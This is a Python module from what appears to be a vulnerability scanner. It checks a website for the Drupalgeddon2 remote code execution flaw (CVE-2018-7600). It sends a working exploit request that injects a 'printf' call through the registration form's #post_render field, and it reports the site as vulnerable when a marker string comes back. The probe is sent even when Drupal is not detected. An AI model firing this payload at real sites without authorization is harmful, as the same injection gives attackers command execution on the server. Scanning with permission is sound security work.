import asyncio
from modules.core import console

# Drupal Scanner (CMS RCE)
# Focus: Drupalgeddon2 (CVE-2018-7600).
# Vulnerability: Unsanitized form inputs allow RCE.
# Path: /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax

async def check_drupal(session, url):
    try:
        # Check if it is Drupal first? 
        # Header: X-Generator: Drupal
        # or meta tag
        
        is_drupal = False
        async with session.get(url, timeout=5, ssl=False) as resp:
            text = await resp.text()
            if "Drupal" in text or "drupal" in resp.headers.get("X-Generator", "").lower():
                is_drupal = True
        
        if not is_drupal:
             # Fast fail if detection fails, or proceed if user forcing?
             # Let's proceed cautiously.
             pass

        # CVE-2018-7600 Payload (Echo Test)
        target = f"{url.rstrip('/')}/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
        
        payload = {
            'form_id': 'user_register_form',
            '_drupal_ajax': '1', 
            'mail[#post_render][]': 'printf',
            'mail[#type]': 'markup',
            'mail[#markup]': 'snakebite_rce_test' 
        }
        
        async with session.post(target, data=payload, timeout=5, ssl=False) as resp:
            text = await resp.text()
            if "snakebite_rce_test" in text and resp.status == 200:
                 return {
                    "url": target,
                    "type": "Drupalgeddon2 (CVE-2018-7600)",
                    "evidence": "RCE Confirmed: 'printf' executed successfully."
                }

    except Exception:
        pass
    return None

async def scan_drupal(session, url):
    """
    Scan for Drupal Vulnerabilities (RCE).
    """
    console.print(f"\n[bold cyan]--- Drupal Scanner ---[/bold cyan]")
    
    results = []
    res = await check_drupal(session, url)
    if res:
         console.print(f"  [bold red][!] DRUPAL RCE VULNERABLE: {res['url']}[/bold red]")
         console.print(f"      Evidence: {res['evidence']}")
         results.append(res)
         
    if not results:
        console.print("[dim][-] No Drupalgeddon2 indicators found.[/dim]")
        
    return results
